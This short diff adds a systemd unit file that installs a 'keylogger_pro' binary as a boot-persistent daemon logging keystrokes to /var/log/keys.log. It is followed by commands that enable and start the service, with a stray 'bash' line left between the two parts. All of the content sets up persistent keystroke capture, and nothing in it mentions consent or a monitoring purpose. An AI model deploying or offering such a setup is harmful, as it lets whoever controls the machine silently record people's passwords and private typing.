@@ -1,0 +1,17 @@
+[Unit]
+Description=Keystroke capture service
+After=multi-user.target
+
+[Service]
+Type=forking
+ExecStart=/usr/local/bin/keylogger_pro --daemon -o /var/log/keys.log
+PIDFile=/tmp/keylogger.pid
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+
+bash
+
+sudo systemctl enable --now keylogger
+sudo systemctl status keylogger
